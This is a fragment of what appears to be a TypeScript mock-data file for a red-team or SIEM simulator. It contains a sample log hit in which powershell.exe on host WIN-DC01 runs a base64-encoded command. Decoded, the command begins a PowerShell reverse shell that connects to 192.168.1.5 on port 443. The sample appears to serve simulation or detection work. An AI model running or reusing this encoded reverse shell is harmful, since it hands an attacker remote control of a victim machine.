import { Listener, Agent, Loot, SiemConfig, SiemRule, Redirector } from '../types';
        ...
        "hits": [
            {
                ...
                "_source": {
                    ...
                    "process": {
                        "name": "powershell.exe",
                        "pid": 4512,
                        "command_line": "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AI..."
                    },
                    "host": {
                        "name": "WIN-DC01"
                    },
